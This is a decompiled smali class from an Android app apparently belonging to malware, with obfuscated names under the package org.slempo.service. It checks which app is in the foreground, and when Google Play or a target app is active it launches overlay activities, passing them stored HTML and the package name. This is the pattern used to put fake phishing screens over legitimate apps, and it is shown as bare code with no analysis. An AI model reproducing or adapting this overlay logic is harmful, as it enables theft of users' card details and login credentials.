.class Lorg/slempo/service/tiunjvmkldioew$2;
.super Ljava/lang/Object;
.source "tiunjvmkldioew.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/tiunjvmkldioew;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/slempo/service/tiunjvmkldioew;


# direct methods
.method constructor <init>(Lorg/slempo/service/tiunjvmkldioew;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    .line 72
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    const/high16 v9, 0x10000000

    const/high16 v8, 0x20000

    .line 75
    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    invoke-static {v5}, Lorg/slempo/service/tiunjvmkldioew;->access$1(Lorg/slempo/service/tiunjvmkldioew;)Ljava/lang/String;

    move-result-object v4

    .line 76
    .local v4, "packageName":Ljava/lang/String;
    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    invoke-static {v5, v4}, Lorg/slempo/service/tiunjvmkldioew;->access$2(Lorg/slempo/service/tiunjvmkldioew;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 77
    .local v1, "html":Ljava/lang/String;
    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    const-string v6, "com.android.vending"

    invoke-virtual {v5, v6}, Lorg/slempo/service/tiunjvmkldioew;->isRunning(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_0

    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    const-string v6, "com.google.android.music"

    invoke-virtual {v5, v6}, Lorg/slempo/service/tiunjvmkldioew;->isRunning(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 78
    :cond_0
    invoke-static {}, Lorg/slempo/service/tiunjvmkldioew;->access$3()Landroid/content/SharedPreferences;

    move-result-object v5

    const-string v6, "CODE_IS_SENT"

    .line 79
    const/4 v7, 0x0

    .line 78
    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    .line 79
    if-nez v5, :cond_2

    .line 80
    new-instance v2, Landroid/content/Intent;

    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    const-class v6, Lorg/slempo/service/activities/ewkdmcopwekewd;

    invoke-direct {v2, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 81
    .local v2, "i":Landroid/content/Intent;
    invoke-virtual {v2, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 82
    invoke-virtual {v2, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 83
    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    invoke-virtual {v5, v2}, Lorg/slempo/service/tiunjvmkldioew;->startActivity(Landroid/content/Intent;)V

    .line 98
    .end local v2    # "i":Landroid/content/Intent;
    :cond_1
    :goto_0
    return-void

    .line 84
    :cond_2
    const-string v5, ""

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    .line 85
    new-instance v2, Landroid/content/Intent;

    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    invoke-static {v5}, Lorg/slempo/service/tiunjvmkldioew;->access$0(Lorg/slempo/service/tiunjvmkldioew;)Landroid/content/Context;

    move-result-object v5

    const-class v6, Lorg/slempo/service/activities/reoidksmciwposdc;

    invoke-direct {v2, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 86
    .restart local v2    # "i":Landroid/content/Intent;
    invoke-virtual {v2, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 87
    invoke-virtual {v2, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 89
    :try_start_0
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 90
    .local v3, "jObject":Lorg/json/JSONObject;
    const-string v5, "html"

    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 91
    const-string v5, "package"

    invoke-virtual {v3, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 92
    const-string v5, "values"

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 93
    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew$2;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    invoke-static {v5}, Lorg/slempo/service/tiunjvmkldioew;->access$0(Lorg/slempo/service/tiunjvmkldioew;)Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 94
    .end local v3    # "jObject":Lorg/json/JSONObject;
    :catch_0
    move-exception v0

    .line 95
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method
